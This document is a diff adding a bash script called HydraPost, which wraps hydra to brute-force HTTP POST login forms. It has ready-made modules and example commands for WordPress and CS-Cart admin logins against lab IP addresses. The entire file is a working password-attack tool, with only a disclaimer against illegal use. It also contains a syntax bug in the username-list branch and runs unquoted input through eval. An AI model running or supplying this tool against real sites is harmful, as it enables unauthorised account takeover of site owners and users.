@@ -1,0 +1,212 @@
+#!/bin/bash
+
+this=$(basename $0)
+
+header() {
+    echo "HydraPost v1.0 (c) by NoodleOfDeath - Please do not use in military or secret service organizations, or for illegal purposes."
+    echo
+    echo "This is a composite bash command designed to more conveniently mount and run hydra password attacks on http post forms"
+    echo
+}
+
+header
+
+usage() {
+    echo "Syntax: $this [[-l login | -L FILE] [-p pass | -P FILE]] [-u portal | -m module] [-a params] [-c check] <host>"
+    echo
+    echo "Options:"
+    echo "  -h|--help               show this help message"
+    echo "  -l LOGIN or -L  FILE    login with LOGIN name, or load several logins from FILE"
+    echo "  -p PASS  or -P  FILE    try password PASS, or load several passwords from FILE"
+    echo "  -o offset               password to start from in the provided password list"
+    echo "  -u portal               portal page relative to the host one which to run the password attack"
+    echo "  -a params               additional post parameters to send with each login attempt"
+    echo "  -c check                grep-like expression used to determine if a login was successful or has failed"
+    echo "  -m module               module to run this brute force password attack with; this must be specified if -u and -c options are not supplied"
+    echo "  -s                      lists all http-post-form modules that can be used with this tool"
+    echo "  -I                      force hydra to ignore any saved hyrda session"
+    echo
+    echo "Example (cscart):"
+    echo "  $this -l admin -p admin -u '/admin.php' -a 'target=auth&mode=login&redirect_url=admin.php&user_login=^USER^&password=^PASS^' -c 'S=Administration' 10.11.1.24"
+    echo "  $this -L user.txt -P pass.txt -u '/admin.php' -a 'target=auth&mode=login&redirect_url=admin.php&user_login=^USER^&password=^PASS^' -c 'S=Administration' 10.11.1.24"
+    echo "  $this -P pass.txt -u '/admin.php' -a 'target=auth&mode=login&redirect_url=admin.php&user_login=^USER^&password=^PASS^' -c 'S=Administration' 10.11.1.24"
+    echo "All of the following are equivalent:"
+    echo "  $this -l admin -u '/admin.php' -a 'target=auth&mode=login&redirect_url=admin.php&user_login=^USER^&password=^PASS^' -c 'S=Administration' 10.11.1.24"
+    echo "  $this -u '/admin.php' -a 'target=auth&mode=login&redirect_url=admin.php&user_login=^USER^&password=^PASS^' -c 'S=Administration' 10.11.1.24"
+    echo "  $this -m cscart 10.11.1.24"
+    echo
+    echo "Example (wordpress):"
+    echo "  $this -l admin -p admin -u '/wp-login.php' -a 'log=^USER^&pwd=^PASS^' -c 'S=Dashboard' 10.11.1.234"
+    echo "  $this -L user.txt -P pass.txt -u '/wp-login.php' -a 'log=^USER^&pwd=^PASS^' -c 'S=Dashboard' 10.11.1.234"
+    echo "  $this -P pass.txt -u '/wp-login.php' -a 'log=^USER^&pwd=^PASS^' -c 'S=Dashboard' 10.11.1.234"
+    echo "All of the following are equivalent:"
+    echo "  $this -l admin -u '/wp-login.php' -a 'log=^USER^&pwd=^PASS^' -c 'S=Dashboard' 10.11.1.234"
+    echo "  $this -u '/wp-login.php' -a 'log=^USER^&pwd=^PASS^' -c 'S=Dashboard' 10.11.1.234"
+    echo "  $this -m wordpress 10.11.1.234"
+}
+
+listmodules() {
+    echo "Loadable Modules:"
+    echo "  cscart: default-portal='/admin.php', default-check='S=Administration'"
+    echo "  wordpress: default-portal='/wp-login.php', default-check='S=Dashboard'"
+}
+
+args=""
+
+while (( "$#" )); do
+    case "$1" in
+        -h|--help)
+            usage
+            exit 0
+            ;;
+        -l)
+            user=$2
+            shift 2
+            ;;
+        -L)
+            ulist=$2
+            shift 2
+            ;;
+        -p)
+            pass=$2
+            shift 2
+            ;;
+        -P)
+            plist=$2
+            shift 2
+            ;;
+        -o)
+            offset=$2
+            shift 2
+            ;;
+        -u)
+            portal=$2
+            shift 2
+            ;;
+        -a)
+            params=$2
+            shift 2
+            ;;
+        -c)
+            check=$2
+            shift 2
+            ;;
+        -m)
+            module=$2
+            shift 2
+            ;;
+        -s)
+            listmodules
+            exit 0
+            ;;
+        -I)
+            iflag=true
+            shift
+            ;;
+        -*|--*=)
+            echo "Error: Unsupported flag $1" >&2
+            usage
+            exit 1
+            ;;
+        *)
+            if [ -z "$args" ]; then
+                args="$1"
+            else
+                args="$args $1"
+            fi
+            shift
+            ;;
+    esac
+done
+
+if [ -z "$user" ] && [ -z "$ulist" ]; then
+    echo "No login or username list supplied. Using default value: admin"
+    user=admin
+fi
+
+if [ -z "$pass" ] && [ -z "$plist" ]; then
+    echo "No password or password list supplied. Attempting to use default value: $HYDRA_POST_PLIST"
+    if [ -z "$HYDRA_POST_PLIST" ] || [ ! -f $HYDRA_POST_PLIST ]; then
+        echo "Unable to find default password list at $HYDRA_POST_PLIST. Please specify an alternate password file using the -p/-P flags, or, change the default password file by setting the environment variable HYDRA_POST_PLIST=/path/to/default/password/list"
+        usage
+        exit 1
+    else
+        plist=$HYDRA_POST_PLIST
+    fi
+fi
+
+host=${args[0]}
+
+if [ ! -z "$module" ]; then
+    case "$module" in
+        cscart)
+            defportal="/admin.php"
+            defparams="target=auth&mode=login&redirect_url=admin.php&user_login=^USER^&password=^PASS^"
+            defcheck="S=Administration"
+            ;;
+        wordpress)
+            defportal="/wp-login.php"
+            defparams="log=^USER^&pwd=^PASS^"
+            defcheck="S=Dashboard"
+            ;;
+        *)
+            echo "Unknown module supplied. Run '$this -s' to display all possible modules"
+            usage
+            exit 1
+            ;;
+    esac
+fi
+
+if [ -z "$host" ]; then
+    echo "No host supplied"
+    usage
+    exit 1
+fi
+
+if [ -z "$portal" ]; then
+    if [ -z "$defportal" ]; then
+        echo "No portal or module supplied"
+        usage
+        exit 1
+    else
+        echo "No portal supplied. Using default value: $defportal"
+        portal=$defportal
+    fi
+fi
+
+if [ -z "$check" ]; then
+    echo "No check expression supplied. Using default value: $defcheck"
+    check=$defcheck
+fi
+
+cmd="hydra "
+
+if [ -z "$ulist" ]; then
+    cmd="$cmd -l $user"
+else
+    cmd ="$cmd -L $ulist"
+fi
+
+if [ -z "$plist" ]; then
+    cmd="$cmd -p $pass"
+else
+    if [ ! -z "$offset" ]; then
+        cat $plist | sed -n -e "/"$offset"/ { :a; n; p; ba; }" > /tmp/$this-plist.txt
+        cmd="$cmd -P /tmp/$this-plist.txt"
+    else
+        cmd="$cmd -P $plist"
+    fi
+fi
+
+if [ ! -z "$defparams" ]; then
+    params="$defparams&$params"
+fi
+
+cmd="$cmd $host -V http-post-form '$portal:$params:$check'"
+
+if [ $iflag ]; then
+    cmd="$cmd -I"
+fi
+
+echo $cmd
+eval $cmd
